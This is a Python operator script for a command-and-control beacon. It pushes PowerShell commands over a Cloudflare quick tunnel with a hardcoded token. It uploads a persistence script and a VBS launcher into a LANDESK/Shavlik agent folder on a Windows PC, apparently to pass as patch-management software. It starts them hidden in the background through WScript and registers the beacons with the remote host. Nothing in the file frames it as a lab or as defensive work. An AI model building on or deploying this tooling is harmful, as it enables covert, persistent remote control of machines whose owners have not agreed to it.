import json
import urllib.request
import base64
import sys
import os

TOKEN = "mothership-beacon-2024"
TUNNEL = "https://rugs-mlb-whole-assess.trycloudflare.com"

def send_command(command):
    data = json.dumps({"command": command}).encode()
    req = urllib.request.Request(
        TUNNEL + "/api/beacon/command",
        data=data,
        headers={
            "Content-Type": "application/json",
            "x-beacon-token": TOKEN,
        },
    )
    resp = urllib.request.urlopen(req, timeout=120)
    return json.loads(resp.read().decode())

def send_file(local_path, remote_dir, remote_name):
    """Upload a file to the PC via base64."""
    with open(local_path, "rb") as f:
        content = f.read()
    b64 = base64.b64encode(content).decode()
    ps_cmd = (
        "$b=[Convert]::FromBase64String('" + b64 + "'); "
        "[System.IO.File]::WriteAllBytes('" + remote_dir.replace("'", "''") + "\\" + remote_name + "', $b); "
        "Write-Host ('Wrote ' + $b.Length + ' bytes')"
    )
    return send_command(ps_cmd)

def main():
    if len(sys.argv) < 2:
        print("Commands: deploy, run, launch, full, check, list")
        return
    
    cmd = sys.argv[1]
    
    if cmd == "deploy":
        # Upload beacon_persist.py to PC
        result = send_file(
            "/project/workspace/web-terminal/public/beacon_persist.py",
            "C:\\ProgramData\\LANDESK\\Shavlik Protect\\Agent",
            "beacon_persist.py"
        )
        print("Deploy result:", json.dumps(result, indent=2))
    
    elif cmd == "run":
        # Run the beacon script in foreground (with timeout, the WS command will wait)
        result = send_command(
            "& 'C:\\Program Files\\Python310\\python.exe' 'C:\\ProgramData\\LANDESK\\Shavlik Protect\\Agent\\beacon_persist.py' 2>&1"
        )
        print("Run result:", json.dumps(result, indent=2))
    
    elif cmd == "launch":
        # Launch beacon in background via WScript COM
        result = send_command(
            "$ws = New-Object -ComObject WScript.Shell; "
            "$ws.Run('\"C:\\Program Files\\Python310\\python.exe\" \"C:\\ProgramData\\LANDESK\\Shavlik Protect\\Agent\\beacon_persist.py\"', 0, $false); "
            "Write-Host 'Launched in background'"
        )
        print("Launch result:", json.dumps(result, indent=2))
    
    elif cmd == "check":
        # Check if Python beacon is running
        result = send_command(
            "Get-Process -Name python* -ErrorAction SilentlyContinue | "
            "Select-Object Id,ProcessName,StartTime,HasExited | "
            "Format-Table -AutoSize"
        )
        print("Process check:", json.dumps(result, indent=2))
    
    elif cmd == "list":
        # List beacons
        req = urllib.request.Request(
            TUNNEL + "/api/beacon/list",
            headers={"x-beacon-token": TOKEN},
        )
        resp = urllib.request.urlopen(req, timeout=10)
        print(json.dumps(json.loads(resp.read().decode()), indent=2))
    
    elif cmd == "full":
        # Full deployment: deploy + launch
        print("=== Step 1: Deploy beacon ===")
        result = send_file(
            "/project/workspace/web-terminal/public/beacon_persist.py",
            "C:\\ProgramData\\LANDESK\\Shavlik Protect\\Agent",
            "beacon_persist.py"
        )
        print(json.dumps(result, indent=2))
        
        if result.get("exitCode") == 0:
            print("\n=== Step 2: Launch beacon in background ===")
            result = send_command(
                "$ws = New-Object -ComObject WScript.Shell; "
                "$ws.Run('\"C:\\Program Files\\Python310\\python.exe\" \"C:\\ProgramData\\LANDESK\\Shavlik Protect\\Agent\\beacon_persist.py\"', 0, $false); "
                "Write-Host 'Launched'"
            )
            print(json.dumps(result, indent=2))
    
    elif cmd == "test-mini":
        # Create and run a minimal registration test
        mini_code = (
            "import urllib.request,json,sys; "
            "d=json.dumps({'beaconId':'mini-test2','info':{'test':True,'python':sys.version}}).encode(); "
            "r=urllib.request.urlopen("
             "'https://rugs-mlb-whole-assess.trycloudflare.com/api/beacon/register', "
            "data=d, headers={'Content-Type':'application/json','x-beacon-token':'mothership-beacon-2024'}, "
            "timeout=10"
            "); "
            "print('Register OK:', r.read().decode())"
        )
        
        result = send_command(
            "& 'C:\\Program Files\\Python310\\python.exe' -c \"" + mini_code + "\" 2>&1"
        )
        print("Mini test result:", json.dumps(result, indent=2))
    
    elif cmd == "deploy-vbs":
        # Deploy VBS launcher
        result = send_file(
            "/project/workspace/web-terminal/public/beacon-launch.vbs",
            "C:\\ProgramData\\LANDESK\\Shavlik Protect\\Agent",
            "beacon-launch.vbs"
        )
        print("Deploy VBS result:", json.dumps(result, indent=2))
    
    elif cmd == "test-vbs":
        # Run VBS launcher via cscript
        result = send_command(
            "cscript.exe //Nologo \"C:\\ProgramData\\LANDESK\\Shavlik Protect\\Agent\\beacon-launch.vbs\""
        )
        print("VBS result:", json.dumps(result, indent=2))
    
    elif cmd == "test-conn":
        # Test connectivity to tunnel from PC
        test_code = (
            "import urllib.request; "
            "r=urllib.request.urlopen('https://rugs-mlb-whole-assess.trycloudflare.com/health', timeout=10); "
            "print('OK:', r.read().decode())"
        )
        result = send_command(
            "& 'C:\\Program Files\\Python310\\python.exe' -c \"" + test_code + "\" 2>&1"
        )
        print("Conn test result:", json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
